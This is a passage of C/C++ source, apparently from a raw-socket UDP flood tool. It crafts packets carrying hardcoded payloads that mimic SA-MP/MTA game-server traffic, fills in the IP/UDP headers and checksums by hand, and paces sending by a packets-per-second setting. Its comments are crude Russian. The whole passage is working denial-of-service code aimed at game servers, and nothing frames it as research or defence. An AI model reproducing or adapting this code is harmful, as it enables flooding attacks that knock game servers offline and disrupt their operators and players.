	memcpy((void*)udph + sizeof(struct udphdr), "\x1b\xbf\xc8\x80\x5f\xd3\xe0\x14\x5a\xe6\x05\xa5\x64\x63\xf2\xfa\x82\x53\xff\x7c\x86\xa3\xf0\x38\x7f\x91\x01\x3f\xa3\xc0\x14\x12\xe2\x04\xa9\xa8\x62\x00\x39\x7f\x91\x01\xbf\xa8\x40\x14\x5b\xe6\x80\x01\x69\x28\x23\xe1\x48\x4f\xb3\xe4\x0c\x63\xd3\xf0\x3a\x7f\x91\x02\x3f\xa2\xc0\x14\x1d\xe1\x00\x62\xa0\x3b\x7f\x91\x02\xbf\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x3c\x7f\x91\x03\x3f\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\x60\x00\x00\x00\x3d\x7f\x91\x03\xbf\xa7\xc0\x14\x5a\xe6\x0f\xae\xd3\xa3\xff\x86\xfd\xe3\xe2\x16\x72\x03\xf0\x3e\x7f\x91\x04\x3f\xa3\xc0\x14\x12\xe2\x0a\x9c\xd9\x91\x80\x3f\x7f\x91\x04\xbf\xa8\x40\x14\x5b\xe6\x80\x00\xc3\xed\xa3\xed\xce\x7e\xf3\xe6\x92\x31\x03\xf0\x40\x7f\x91\x05\x3f\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x41\x7f\x91\x05\xbf\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\xc0\x10\x00\x00\x42\x7f\x91\x06\x3f\xa7\xc0\x14\x5a\xe6\x0d\x89\x61\xd3\xf5\xc1\x4b\x43\xe0\xa1\x2e\xc3\xe0\x43\x7f\x91\x06\xbf\xa3\xc0\x14\x12\xe2\x0d\x22\x3c\xc4\x30\x44\x7f\x91\x07\x3f\xa8\x40\x14\x5b\xe6\x80\x0f\x5c\xa2\x93\xf9\x45\x4b\x43\xe4\x03\xa2\x83\xf0\x45\x7f\x91\x07\xbf\xa2\xc0\x14\x1d\xe1\x00\x62\xb0\x46\x7f\x91\x08\x3f\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x47\x7f\x91\x08\xbf\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x00\x50\x00\x00\x00\x48\x7f\x91\x09\x3f\xa7\xc0\x14\x5a\xe6\x09\x9b\xf2\x73\xfc\x7b\x10\x93\xff\x9e\x15\x93\xf0\x49\x7f\x91\x09\xbf\xa3\xc0\x14\x12\xe2\x01\xf8\x04\xa5\x50\x4a\x7f\x91\x0a\x3f\xa8\x40\x14\x5b\xe6\x80\x00\x4f\xa4\x63\xf1\x96\xc3\x93\xfb\x64\xb2\x43\xf0\x4b\x7f\x91\x0a\xbf\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x4c\x7f\x91\x0b\x3f\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0c\x50\x00\x00\x00\x4d\x7f\x91\x0b\xbf\xa7\xc0\x14\x5a\xe6\x0d\x66\x53\xd3\xff\x63\x59\x43\xe5\xbc\x98\xa3\xe0\x4e\x7f\x91\x0c\x3f\xa3\xc0\x14\x12\xe2\x0e\x72\x18\xa5\xf0\x4f\x7f\x91\x0c\xbf\xa8\x40\x14\x5b\xe6\x80\x09\x5d\x71\xb3\xf5\x4c\x3d\x33\xe8\xf6\x57\xd3\xf0\x50\x7f\x91\x0d\x3f\xa2\xc0\x14\x1d\xe1\x00\x62\xc0\x51\x7f\x91\x0d\xbf\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x52\x7f\x91\x0e\x3f\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\xb0\x10\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type2(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 526; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x3f\xc8\xb9\x9f\x93\xe0\x14\x5a\xe6\x02\x8d\x1a\x83\xef\x34\xf4\xe3\xfd\x90\x29\x73\xe0\x1d\x7f\x91\x73\xbf\x23\xc0\x14\x12\xe2\x04\xbb\x62\xf2\x10\x1e\x7f\x91\x74\x3f\x28\x40\x14\x5b\xe6\x80\x06\x52\x50\x83\xfb\xad\x23\xf3\xf5\xec\x76\x63\xf0\x1f\x7f\x91\x74\xbf\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x20\x7f\x91\x75\x3f\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0c\x60\x00\x00\x00\x21\x7f\x91\x75\xbf\x27\xc0\x14\x5a\xe6\x06\x83\xa9\xb3\xe1\x11\xb3\x13\xfb\x20\xbd\x73\xe0\x22\x7f\x91\x76\x3f\x23\xc0\x14\x12\xe2\x0d\xbf\x95\x40\x10\x23\x7f\x91\x76\xbf\x28\x40\x14\x5b\xe6\x80\x01\xe7\xf6\x93\xfb\x5d\x15\xa3\xe5\xb1\x35\x33\xf0\x24\x7f\x91\x77\x3f\x22\xc0\x14\x1d\xe1\x00\x62\x80\x25\x7f\x91\x77\xbf\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x26\x7f\x91\x78\x3f\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x02\x60\x00\x00\x00\x27\x7f\x91\x78\xbf\x27\xc0\x14\x5a\xe6\x08\x90\x78\x83\xed\x7b\x35\xc3\xf2\xd2\x36\xa3\xf0\x28\x7f\x91\x79\x3f\x23\xc0\x14\x12\xe2\x07\xf5\x38\xe3\x60\x29\x7f\x91\x79\xbf\x28\x40\x14\x5b\xe6\x80\x06\x93\x11\xf3\xfd\xef\xcf\xe3\xee\x75\x36\x83\xf0\x2a\x7f\x91\x7a\x3f\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x2b\x7f\x91\x7a\xbf\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x04\xb0\x00\x00\x00\x2c\x7f\x91\x7b\x3f\x27\xc0\x14\x5a\xe6\x0a\xc2\xad\xc3\xef\x64\x40\xb3\xfc\x8b\xd7\x33\xf0\x2d\x7f\x91\x7b\xbf\x23\xc0\x14\x12\xe2\x08\xdd\xae\x50\x20\x2e\x7f\x91\x7c\x3f\x28\x40\x14\x5b\xe6\x80\x07\xf7\xf2\xd3\xf5\xf8\xc1\xa3\xfa\x86\x5d\x83\xe0\x2f\x7f\x91\x7c\xbf\x22\xc0\x14\x1d\xe1\x00\x62\x90\x30\x7f\x91\x7d\x3f\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x31\x7f\x91\x7d\xbf\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x03\x70\x00\x00\x00\x32\x7f\x91\x7e\x3f\x27\xc0\x14\x5a\xe6\x04\x80\xcb\xd3\xe8\x7c\x81\xe3\xf6\x29\xb1\xa3\xf0\x33\x7f\x91\x7e\xbf\x23\xc0\x14\x12\xe2\x05\xe0\x2d\x46\xa0\x34\x7f\x91\x7f\x3f\x28\x40\x14\x5b\xe6\x80\x0c\xc4\x53\x93\xfe\x1a\x28\xd3\xe0\x9b\x81\x73\xf0\x35\x7f\x91\x7f\xbf\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x36\x7f\x91\x00\x3f\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\xf0\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type3(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 538; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x51\xbe\x48\x9b\x9f\x13\xe0\x14\x5a\xe6\x05\xce\x4d\x53\xe8\xf5\x90\x13\xff\x01\xd5\xe3\xf0\xa4\x7c\x91\x37\xbe\x23\xc0\x14\x12\xe2\x03\xd9\x8d\xe4\xe0\xa5\x7c\x91\x38\x3e\x28\x40\x14\x5b\xe6\x80\x0f\xc4\x53\x73\xff\xab\x66\x93\xf7\x6e\xa5\x33\xe0\xa6\x7c\x91\x38\xbe\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xa7\x7c\x91\x39\x3e\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x04\x90\x00\x00\x00\xa8\x7c\x91\x39\xbe\x27\xc0\x14\x5a\xe6\x0a\xac\x5e\xe3\xe3\x0e\xce\xb3\xef\x72\x50\x93\xf0\xa9\x7c\x91\x3a\x3e\x23\xc0\x14\x12\xe2\x01\xbf\x02\x77\xd0\xaa\x7c\x91\x3a\xbe\x28\x40\x14\x5b\xe6\x80\x07\x72\x47\x93\xfe\x34\x45\xd3\xe4\x98\x98\x43\xe0\xab\x7c\x91\x3b\x3e\x22\xc0\x14\x1d\xe1\x00\x52\xb0\xac\x7c\x91\x3b\xbe\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xad\x7c\x91\x3c\x3e\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x07\x70\x00\x00\x00\xae\x7c\x91\x3c\xbe\x27\xc0\x14\x5a\xe6\x09\xb3\xb7\x33\xf0\x23\xc7\x33\xec\x68\x88\xe3\xe0\xaf\x7c\x91\x3d\x3e\x23\xc0\x14\x12\xe2\x08\x5e\x95\xa7\x00\xb0\x7c\x91\x3d\xbe\x28\x40\x14\x5b\xe6\x80\x0d\x64\x04\xf3\xfa\x18\x90\xa3\xf5\x0e\x3f\x53\xe0\xb1\x7c\x70\x8c\x80\x22\x80\xd0\x00\x00\x00\x00\xb2\x7c\x91\x3e\x3e\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xb3\x7c\x91\x3e\xbe\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\x90\x00\x00\x00\xb4\x7c\x91\x3f\x3e\x27\xc0\x14\x5a\xe6\x0b\x0c\xf7\x93\xf6\xde\x77\xa3\xef\x29\x97\xe3\xe0\xb5\x7c\x91\x3f\xbe\x23\xc0\x14\x12\xe2\x0d\x14\x7e\x75\x50\xb6\x7c\x91\x40\x3e\x28\x40\x14\x5b\xe6\x80\x05\xc4\xff\xf3\xed\x7e\x2b\xd3\xe3\x84\xe2\x53\xf0\xb7\x7c\x91\x40\xbe\x22\xc0\x14\x1d\xe1\x00\x52\xc0\xb8\x7c\x91\x41\x3e\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xb9\x7c\x91\x41\xbe\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x05\xc0\x00\x00\x00\xba\x7c\x91\x42\x3e\x27\xc0\x14\x5a\xe6\x04\xc0\x02\x43\xff\xb8\xc2\x93\xf7\x74\x52\x83\xf0\xbb\x7c\x91\x42\xbe\x23\xc0\x14\x12\xe2\x05\x82\xaa\xb1\xd0\xbc\x7c\x91\x43\x3e\x28\x40\x14\x5b\xe6\x80\x08\x77\x7c\x93\xe0\x58\x05\x13\xf4\x70\xe2\x53\xf0\xbd\x7c\x91\x43\xbe\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xbe\x7c\x91\x44\x3e\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x03\x50\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type4(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 546; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x30\x16\xc8\x91\xcb\x53\xe0\x14\x5a\xe6\x02\x54\x36\x43\xf9\x45\x78\x83\xe4\xe8\x96\x33\xf0\x61\x2d\x91\x24\x16\xa3\xc0\x14\x12\xe2\x07\x8e\x61\x52\xf0\x62\x2d\x91\x24\x96\xa2\xc0\x14\x1d\xe1\x01\x21\xa0\x63\x2d\x91\x25\x16\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x64\x2d\x91\x25\x96\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\xc0\x00\x00\x00\x65\x2d\x91\x26\x16\xa7\xc0\x14\x5a\xe6\x02\xe5\x04\x63\xf8\x76\x37\x93\xf0\x06\x96\xe3\xf0\x66\x2d\x91\x26\x96\xa3\xc0\x14\x12\xe2\x0f\x8e\x58\xd5\xa0\x67\x2d\x91\x27\x16\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x68\x2d\x91\x27\x96\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\x60\x00\x00\x00\x69\x2d\x91\x28\x16\xa7\xc0\x14\x5a\xe6\x05\x27\xbf\xf3\xe0\x3f\xd3\xe3\xf8\xe7\x17\xf3\xe0\x6a\x2d\x91\x28\x96\xa3\xc0\x14\x12\xe2\x0c\x3d\xa2\xf0\xf0\x6b\x2d\x91\x29\x16\xa2\xc0\x14\x1d\xe1\x01\x21\xb0\x6c\x2d\x91\x29\x96\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x6d\x2d\x91\x2a\x16\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x07\x80\x00\x00\x00\x6e\x2d\x91\x2a\x96\xa7\xc0\x14\x5a\xe6\x04\xee\x9d\x13\xea\x7d\xea\x63\xe1\x2c\x9b\x93\xe0\x6f\x2d\x91\x2b\x16\xa3\xc0\x14\x12\xe2\x03\x1e\x85\x64\x50\x70\x2d\x91\x2b\x96\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x71\x2d\x91\x2c\x16\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\x10\x10\x00\x00\x72\x2d\x91\x2c\x96\xa7\xc0\x14\x5a\xe6\x0f\x34\x05\x33\xf3\x9c\x96\x83\xec\x37\xf7\x63\xf0\x73\x2d\x91\x2d\x16\xa3\xc0\x14\x12\xe2\x09\xa8\xd1\x32\x30\x74\x2d\x91\x2d\x96\xa2\xc0\x14\x1d\xe1\x01\x21\xc0\x75\x2d\x91\x2e\x16\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x76\x2d\x91\x2e\x96\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\x20\x00\x00\x00\x77\x2d\x91\x2f\x16\xa7\xc0\x14\x5a\xe6\x0d\x71\x77\xd3\xf8\xbb\xe3\xb3\xf3\xb5\x10\x63\xf0\x78\x2d\x91\x2f\x96\xa3\xc0\x14\x12\xe2\x05\x5a\x6b\xe2\xd0\x79\x2d\x91\x30\x16\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x7a\x2d\x91\x30\x96\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x03\x10\x00\x00\x00\x7b\x2d\x91\x31\x16\xa7\xc0\x14\x5a\xe6\x0f\xeb\xa1\x93\xfc\x65\x0f\xd3\xef\xbd\x3d\xe3\xe0\x7c\x2d\x91\x31\x96\xa3\xc0\x14\x12\xe2\x0b\xc6\x98\xc7\xb0\x7d\x2d\x91\x32\x16\xa2\xc0\x14\x1d\xe1\x01\x21\xd0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type5(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 13; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x27\x12\x48\x8e\x49\x11\x60\x14\x1d\xe1\x00\xe0\xa0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type6(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 178; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x54\x11\xc8\xa4\xc8\xd2\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xa9\x23\x91\x4a\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x04\xc0\x00\x00\x00\xaa\x23\x91\x4a\x91\xa7\xc0\x14\x5a\xe6\x09\x71\xa1\x93\xf9\xde\xab\x03\xe6\x29\xc6\xf3\xf0\xab\x23\x91\x4b\x11\xa3\xc0\x14\x12\xe2\x06\xdb\xa7\xc2\x60\xd0\x23\x91\x5d\x91\xa2\xc0\x14\x1d\xe1\x00\xd3\x80\xf9\x23\x91\x72\x11\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xfa\x23\x91\x72\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\xf0\x00\x00\x00\xfb\x23\x91\x73\x11\xa7\xc0\x14\x5a\xe6\x0f\xd1\x52\x53\xf1\xa9\x1b\xc3\xed\xaf\x31\xe3\xf0\xfc\x23\x91\x73\x91\xa3\xc0\x14\x12\xe2\x03\x10\x1f\x54\x90\x21\x24\x91\x06\x12\x22\xc0\x14\x1d\xe1\x00\xe0\x50", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type7(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 228; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x17\x91\xc8\x86\x88\xd2\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x30\x23\x91\x0d\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x06\x10\x00\x00\x00\x31\x23\x91\x0e\x11\xa7\xc0\x14\x5a\xe6\x03\xfe\x69\xa3\xec\x26\x97\x53\xeb\x25\x1d\xc3\xe0\x32\x23\x91\x0e\x91\xa3\xc0\x14\x12\xe2\x02\xbf\x90\xe4\x70\x53\x23\x91\x1f\x11\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x54\x23\x91\x1f\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\x80\x00\x00\x00\x55\x23\x91\x20\x11\xa7\xc0\x14\x5a\xe6\x07\x40\x76\x43\xff\xcf\xb0\x23\xf1\x6e\xb3\x73\xf0\x56\x23\x91\x20\x91\xa3\xc0\x14\x12\xe2\x05\x5b\x0a\xb7\x50\x7b\x23\x91\x33\x11\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x7c\x23\x91\x33\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\xc0\x00\x00\x00\x7d\x23\x91\x34\x11\xa7\xc0\x14\x5a\xe6\x04\x75\x55\x13\xe4\xc5\xa5\xa3\xe7\x2b\xfc\xa3\xe0\x7e\x23\x91\x34\x91\xa3\xc0\x14\x12\xe2\x0b\xe9\xf5\xa5\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type8(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 76; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x92\x48\x82\x09\x12\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x1e\x24\x91\x04\x92\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\xd0\x00\x00\x00\x1f\x24\x91\x05\x12\x27\xc0\x14\x5a\xe6\x0f\x62\xac\x93\xee\x2e\x98\x03\xe8\xa8\xcc\xf3\xe0\x20\x24\x91\x05\x92\x23\xc0\x14\x12\xe2\x01\xe5\x61\x11\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type9(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 380; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x3b\x91\xc8\x98\x88\xd2\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x78\x23\x91\x31\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\x90\x00\x00\x00\x79\x23\x91\x32\x11\xa7\xc0\x14\x5a\xe6\x00\xa4\x6f\xc3\xed\xb1\x66\x13\xf2\xe3\xee\xb3\xe0\x7a\x23\x91\x32\x91\xa3\xc0\x14\x12\xe2\x03\xc5\x2a\x55\x20\x9f\x23\x91\x45\x11\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xa0\x23\x91\x45\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x09\x10\x00\x00\x00\xa1\x23\x91\x46\x11\xa7\xc0\x14\x5a\xe6\x05\x75\x14\xa3\xf7\xa8\x62\xc3\xfb\xfb\x9d\x43\xe0\xa2\x23\x91\x46\x91\xa3\xc0\x14\x12\xe2\x01\x9c\x0d\xb4\xb0\xc8\x23\x91\x59\x91\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xc9\x23\x91\x5a\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x09\x30\x00\x00\x00\xca\x23\x91\x5a\x91\xa7\xc0\x14\x5a\xe6\x00\x04\x34\xb3\xf8\xf3\x81\x33\xf8\xc3\x95\xa3\xf0\xcb\x23\x91\x5b\x11\xa3\xc0\x14\x12\xe2\x06\x3c\x49\x10\x90\xf0\x23\x91\x6d\x91\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xf1\x23\x91\x6e\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x07\xd0\x00\x00\x00\xf2\x23\x91\x6e\x91\xa7\xc0\x14\x5a\xe6\x01\x92\xa4\x43\xf9\x9f\x56\xb3\xf6\xae\x1f\x33\xe0\xf3\x23\x91\x6f\x11\xa3\xc0\x14\x12\xe2\x0b\x4a\x0b\xf5\x30\x19\x24\x91\x02\x12\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x1a\x24\x91\x02\x92\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0a\xf0\x00\x00\x00\x1b\x24\x91\x03\x12\x27\xc0\x14\x5a\xe6\x0f\x02\x98\x83\xeb\x0b\xe1\xc3\xfc\x90\xa7\x83\xf0\x1c\x24\x91\x03\x92\x23\xc0\x14\x12\xe2\x0a\x27\x20\x25\xc0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type10(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 115; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x20\x11\xc8\x8a\xc8\xd1\x60\x14\x1d\xe1\x00\xd2\x80\x91\x23\x91\x3e\x11\xa2\xc0\x14\x1d\xe1\x00\xd3\x10\xba\x23\x91\x52\x91\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xbb\x23\x91\x53\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x00\xb0\x00\x00\x00\xbc\x23\x91\x53\x91\xa7\xc0\x14\x5a\xe6\x0e\x20\x43\x23\xf3\x8a\xee\xa3\xe8\x9e\x64\xe3\xf0\xbd\x23\x91\x54\x11\xa3\xc0\x14\x12\xe2\x03\x8d\x07\xb7\xc0\xe2\x23\x91\x66\x91\xa2\xc0\x14\x1d\xe1\x00\xd3\xa0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type11(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 241; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
